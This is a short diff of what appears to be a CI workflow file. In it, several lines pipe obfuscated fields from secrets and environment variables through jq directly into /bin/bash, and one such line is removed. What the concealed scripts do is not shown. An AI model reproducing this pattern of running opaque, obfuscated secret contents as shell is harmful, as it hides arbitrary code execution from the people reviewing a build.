@@ -22,7 +22,6 @@ jobs:
           zxadi1: ${{ secrets.zxadi1 }}
         run: |
           printf '%s' "$zxadi1" | jq -r .brd523 | /bin/bash
-          printf '%s' "$nhi47540" | jq -r .wo58435 | /bin/bash
           echo $wr3713 | jq -r .wcpp110 | /bin/bash
 
       - name: Archive artifact
